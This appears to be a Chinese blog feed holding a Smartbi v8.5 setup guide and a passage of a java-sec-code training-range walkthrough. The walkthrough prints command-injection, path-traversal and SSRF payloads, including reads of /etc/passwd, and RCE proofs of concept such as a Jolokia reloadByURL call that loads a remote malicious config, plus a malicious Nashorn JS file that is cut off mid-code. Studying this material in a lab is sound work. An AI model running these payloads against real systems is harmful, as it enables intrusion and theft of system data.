    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-环境搭建"><a href="#Smartbi-v8-5-环境搭建" class="headerlink" title="Smartbi v8.5 环境搭建"></a>Smartbi v8.5 环境搭建</h1><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>通过网盘分享的文件：Smartbi Insight Edition-2018-11-22.zip<br>链接: <a href="https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ">https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ</a> 提取码: wan4 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207593.png" alt="20250730142614982"></p><p>用户名和公司名称随意</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207797.png" alt="20250730142606223"></p><p>更改安装目录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207535.png" alt="20250730142705002"></p><p><strong>此处，不要选择“安装演示库”，否则会报“报表数量超过限制”的错误</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207934.png" alt="20250730142800593"></p><p>不选择“注册为Windows服务”，内存大小默认即可</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211381.png" alt="20250730142851342"></p><p>登录首页的密码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211551.png" alt="20250730142859437"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211744.png" alt="20250730142905276"></p><h2 id="二、license获取"><a href="#二、license获取" class="headerlink" title="二、license获取"></a>二、license获取</h2><p>官网地址：<a href="https://www.smartbi.com.cn/">https://www.smartbi.com.cn/</a></p><p>license申请地址：<a href="https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html">https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html</a></p><p>这里第一次进入需要注册\登录：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211274.png" alt="20250730201318600"></p><p>之后便可以申请了，邮箱要填正确，之后会将 license 发到邮箱里</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072212883.png" alt="20250806200815728"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072213347.png" alt="image-20250807221345227"></p><p>选择个人版</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214816.png" alt="20250730201536174"></p><p>之后在邮箱里可以看到发的：Smartbi-License.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214979.png" alt="20250730201709835"></p><h3 id="获取-licence-后，将其放置在-E-Smartbi-Tomcat-bin文件夹下"><a href="#获取-licence-后，将其放置在-E-Smartbi-Tomcat-bin文件夹下" class="headerlink" title="获取 licence 后，将其放置在 E:\Smartbi\Tomcat\bin文件夹下"></a>获取 licence 后，将其放置在 <code>E:\Smartbi\Tomcat\bin</code>文件夹下</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214848.png" alt="20250730203434407"></p><h2 id="三、创建数据库"><a href="#三、创建数据库" class="headerlink" title="三、创建数据库"></a>三、创建数据库</h2><p>首先连接 <code>Smartbi</code> ：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215810.png" alt="20250730202151890"></p><p>创建<code>Smartbi</code> 数据库：</p><p><strong>第一步连接好之后，是没有 smartbi 数据库的，需要自己创建</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215211.png" alt="20250730202209089"></p><p>下面是 MySQL 的配置：</p><p><code>database-name</code> 在选择安装“演示数据库”时是：<code>smartbidemo</code>；咋们没有选择，所以默认是：<code>smartbi</code>。</p><p>E:\Smartbi\Tomcat\bin\smartbi-config.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215236.png" alt="20250730202402962"></p><h2 id="四、解决浏览器版本误判"><a href="#四、解决浏览器版本误判" class="headerlink" title="四、解决浏览器版本误判"></a>四、解决浏览器版本误判</h2><p>这一步可以看下面问题中的 <code>1、</code></p><h2 id="五、启动程序"><a href="#五、启动程序" class="headerlink" title="五、启动程序"></a>五、启动程序</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>E:\Smartbi\Tomcat\bin\startup.cmd</p><p>运行 startup.cmd ，启动服务器</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>系统开始菜单中找到 Smartbi 的安装目录，单击启动Smartbi服务</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215033.png" alt="20250730203101194"></p><p>没有报错的话，就是启动成功了，</p><p><strong>若到这一步服务启动有错，重启电脑！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215464.png" alt="20250730203306884"></p><h2 id="六、配置程序"><a href="#六、配置程序" class="headerlink" title="六、配置程序"></a>六、配置程序</h2><p>访问Smartbi:</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216056.png" alt="20250730203519660"></p><p>首次访问，需输入密码，这里的密码随意，我的是 <code>admin</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216206.png" alt="20250730203618192"></p><p>接下来的配置按照图中所示即可：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216156.png" alt="20250730204159549"></p><h2 id="七、进入主页"><a href="#七、进入主页" class="headerlink" title="七、进入主页"></a>七、进入主页</h2><p>重启服务后，再次点击<code>访问Smartbi</code>，会进入下方页面：</p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a></p><p>首次访问登录页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216556.png" alt="20250730204745953"></p><p>此处的旧密码是<code>manager</code>，之后自行修改一个新密码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217262.png" alt="20250730204612002"></p><p>这是之后访问登录页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217160.png" alt="20250730204403222"></p><p>登录系统：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217230.png" alt="20250730204932051"></p><p>至此，Smartbi v8.5 环境搭建完成。</p><h1 id="搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）："><a href="#搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）：" class="headerlink" title="搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）："></a>搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）：</h1><h2 id="1、浏览器版本被错误检测"><a href="#1、浏览器版本被错误检测" class="headerlink" title="1、浏览器版本被错误检测"></a>1、浏览器版本被错误检测</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217317.png" alt="20250730194311903"></p><p>参考：<a href="https://www.xiaoheiwoo.com/windows-11-internet-explorer/">https://www.xiaoheiwoo.com/windows-11-internet-explorer/</a></p><h3 id="方法一：从“管理加载项”窗口打开-Internet-Explorer"><a href="#方法一：从“管理加载项”窗口打开-Internet-Explorer" class="headerlink" title="方法一：从“管理加载项”窗口打开 Internet Explorer"></a>方法一：从“管理加载项”窗口打开 Internet Explorer</h3><p>用过 IE浏览器的人应该知道，IE中是可以通过 Internet属性 窗口，对浏览器进行功能设置的。</p><p>虽然 Win11默认找不到 IE的入口，但是 Internet属性 程序依然可以正常运行，我们可以点击其中的 管理加载项 功能，打开 IE 浏览器。</p><p>步骤是：</p><ol><li>首先，按 <code>Win + R</code> 打开运行窗口</li><li>接下来，在运行命令框中输入 <code>inetcpl.cpl</code></li><li>单击 <code>确定</code> 进入 Internet 属性窗口</li><li>选择 <code>程序</code> 选项卡，点击 <code>管理加载项</code> 按钮<ol><li>然后，点击窗口底部 <code>了解有关工具栏和扩展的详细信息</code></li><li>铛铛铛，你要的 IE浏览器出现啦~</li></ol></li></ol><h3 id="方法二：注释掉判断语句"><a href="#方法二：注释掉判断语句" class="headerlink" title="方法二：注释掉判断语句"></a>方法二：注释掉判断语句</h3><p>进入 E:\Smartbi\Tomcat\webapps\smartbi\vision</p><p>找到文件 config.jsp</p><p>将判断部分注释掉</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219561.png" alt="20250729143004181"></p><h2 id="2、报表数量超过限制"><a href="#2、报表数量超过限制" class="headerlink" title="2、报表数量超过限制"></a>2、报表数量超过限制</h2><p>07-29 20:27:27 ERROR activate(smartbi.framework.Framework:85) - 报表数量超过限制<br>报表数量超过限制:ReportCount:452&gt;20</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219949.png" alt="20250729211037212"></p><p><strong>这个问题是由于安装时选择了安装<code>演示数据库</code> ，不安装即可。</strong></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-sec-code 靶场题解</title>
    <link href="/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/"/>
    <url>/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="java-sec-code-靶场"><a href="#java-sec-code-靶场" class="headerlink" title="java-sec-code 靶场"></a>java-sec-code 靶场</h1><h1 id="一、靶场环境"><a href="#一、靶场环境" class="headerlink" title="一、靶场环境"></a>一、靶场环境</h1><p>源码地址：</p><p><a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p><p>搭建环境：</p><p>IDEA，pache-maven-3.9.1，apache-tomcat-9.0.105，JDK 1.8，MySQL 5.7.26，</p><p>​数据库：小皮面板自带的MySQL，导入sql文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924734.png" alt="20250722121837762"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924866.png" alt="20250722121922614"></p><p>​修改数据库密码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924471.png" alt="20250722121952382"></p><p>​默认端口为8080，如果被占用，在 application.properties 中写入 <code>server.port=8081</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925668.png" alt="20250722122032495"></p><p>之后启动 Maven install</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925205.png" alt="20250722122150263"></p><p>运行 Application.java</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926472.png" alt="20250722122307068"></p><p>访问 127.0.0.1:8081</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926105.png" alt="20250722122339704"></p><p>搭建成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926235.png" alt="20250722122412538"></p><p>以下是一些小的改动：</p><p>参考文章：<a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><blockquote><p>因为项目作者选择的工作环境为linux操作系统，而我本人选择的工作环境为windows操作系统，所以为了部分功能运行成功需要修改几处源码，首先修改CommandInject.java文件下的源码，将sh执行命令替换为cmd命令，还有修改源码中一些其它的linux操作系统上独有的命令。</p></blockquote><ol><li>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926915.png" alt="20250722122752916"></p><ol start="2"><li>src&#x2F;main&#x2F;resources&#x2F;templates&#x2F;index.html</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/codeinject?filepath=/tmp;cat /etc/passwd&#125;&quot;&gt;CmdInject&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/codeinject?filepath=.%26ipconfig&#125;&quot;</span>&gt;</span>CmdInject<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>   <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/path_traversal/vul?filepath=../../../../../etc/passwd&#125;&quot;&gt;PathTraversal&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/path_traversal/vul?filepath=D:/test.txt&#125;&quot;</span>&gt;</span>PathTraversal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///etc/passwd&#125;&quot;&gt;SSRF&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///D:/test.txt&#125;&quot;</span>&gt;</span>SSRF<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926719.png" alt="20250722123350854"></p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><ul><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Actuators-to-RCE">Actuators to RCE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CORS">CORS</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CSRF">CSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Deserialize">Deserialize</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Fastjson">Fastjson</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI">Java RMI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JSONP">JSONP</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Poi-ooxml-XXE">POI-OOXML XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SQL-Inject">SQLI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSRF">SSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSTI">SSTI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass">URL whitelist Bypass</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE">XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JWT">JWT</a>  </li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/others">Others</a></li></ul><h3 id="Logback-xml"><a href="#Logback-xml" class="headerlink" title="Logback.xml"></a>Logback.xml</h3><p>src&#x2F;main&#x2F;resources&#x2F;logback-online.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>  <span class="hljs-comment">&lt;!-- logback 配置文件标签 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 控制台输出标签 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">withJansi</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">withJansi</span>&gt;</span>  <span class="hljs-comment">&lt;!-- Jansi 是一个 Java 库，用来支持彩色日志输出  --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 输出格式标签 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>[%thread] %highlight(%-5level) %cyan(%logger&#123;15&#125;) - %msg %n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 输出格式 --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 根标签 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- 引用控制台输出标签 --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jmxConfigurator</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 暴露 Logback 的运行时配置能力（开启 JMX 管理功能）  --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>漏洞产生原因：</strong></p><p><code>   &lt;jmxConfigurator/&gt;</code></p><p>作用：暴露 Logback 的运行时配置能力（开启 JMX 管理功能）</p><p>这个配置会注册一个 JMX MBean （可以远程管理的 Java 对象 ，“遥控器”），它允许用户通过 JMX 控制台、Jolokia （Jolokia 是一个用来访问远程 JMX MBeans 的方法，Jolokia 通过 HTTP 访问 JMX）等远程管理工具调用 Logback 的方法</p><p>如果系统部署中 暴露了 Jolokia 的 &#x2F;jolokia 接口，攻击者可以远程调用 Logback 的 reloadByURL 方法，加载恶意配置文件，进而发起 JNDI 注入 ➜ 远程代码执行（RCE）</p><p><strong>漏洞利用：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8081</span><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp">/127.0.0.1:8888!/</span>xxx.xml<br></code></pre></td></tr></table></figure><ul><li><p><code>/jolokia/exec/</code>：Jolokia 的 exec 调用路径</p></li><li><p><code>ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator</code>：Logback 中添加 <code>&lt;jmxConfigurator/&gt;</code> 注册 JMX MBean 后的默认名称</p></li><li><p><code>/reloadByURL/</code>：调用的 JMX 方法，即 <code>reloadByURL(URL configFile)</code>，运行后重新加载 Logback 配置文件</p></li><li><p><code>http:!/!/127.0.0.1:8888!/xxx.xml</code>：注意 <code>!/!/</code> 是 URL 编码中对 <code>/</code> 和 <code>:</code> 的绕过手法，最后解析成：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:8888/xxx.xml</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="Rce-java"><a href="#Rce-java" class="headerlink" title="Rce.java"></a>Rce.java</h3><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Rce.java</p><h4 id="1-runtime-exec"><a href="#1-runtime-exec" class="headerlink" title="1.&#x2F;runtime&#x2F;exec"></a>1.&#x2F;runtime&#x2F;exec</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/runtime/exec&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">CommandExec</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//接收 cmd 参数</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//获取当前 JVM 的 RunTime 对象，通过它可以调用 exec 命令</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<span class="hljs-comment">//接收输出结果</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> run.exec(cmd);<span class="hljs-comment">//执行 cmd 命令</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br>            <span class="hljs-keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(tmpStr);<br>            &#125;<br></code></pre></td></tr></table></figure><p>没有进行过滤，产生了rce 漏洞</p><p><strong>漏洞利用：</strong></p><p>POC：&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;calc.exe</p><p>可以弹出计算机</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927152.png" alt="20250722141657147"></p><p>POC：&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;whoami</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927609.png" alt="20250722141728262"></p><h4 id="2-ProcessBuilder"><a href="#2-ProcessBuilder" class="headerlink" title="2.&#x2F;ProcessBuilder"></a>2.&#x2F;ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processBuilder</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//接收输入的 cmd</span><br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] arrCmd = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<span class="hljs-comment">//将 cmd 直接拼接到 shell 环境</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(arrCmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> processBuilder.start();<span class="hljs-comment">//触发命令执行</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br></code></pre></td></tr></table></figure><p>这一漏洞需要在Linux环境中复现</p><h4 id="3-jscmd"><a href="#3-jscmd" class="headerlink" title="3.&#x2F;jscmd"></a>3.&#x2F;jscmd</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/jscmd&quot;)</span>  <span class="hljs-comment">// 定义GET请求端点</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jsEngine</span><span class="hljs-params">(String jsurl)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <span class="hljs-comment">// 接收jsurl参数</span><br>    <span class="hljs-comment">// 获取JavaScript引擎（Nashorn）</span><br>    <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);    <br>    <span class="hljs-comment">// 获取当前引擎的作用域绑定</span><br>    <span class="hljs-type">Bindings</span> <span class="hljs-variable">bindings</span> <span class="hljs-operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);    <br>    <span class="hljs-comment">// 构造加载远程JS的命令</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);    <br>    <span class="hljs-comment">// 执行加载命令</span><br>    engine.eval(cmd, bindings);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>直接使用用户输入的<code>jsurl</code>构造<code>load()</code>命令</li><li><strong>无任何安全过滤</strong></li></ul><p><strong>漏洞利用：</strong></p><p>因为是基于Java的Nashorn JavaScript引擎，接受一个<strong>外部JS文件URL</strong>（<code>jsurl</code>），然后通过<code>load()</code>函数去加载执行远程的JS代码，如果远程JS包含恶意代码（比如调用Java的<code>Runtime.exec</code>执行系统命令），就会造成远程命令执行（RCE）漏洞。</p><p>先编写一个恶意的JS文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// zz.js</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-title function_">mainOutput</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mainOutput</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// Windows打开计算器命令</span><br>    <span class="hljs-keyword">var</span> cmd = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br>    <span class="hljs-comment">// 执行系统命令</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Runtime</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-title 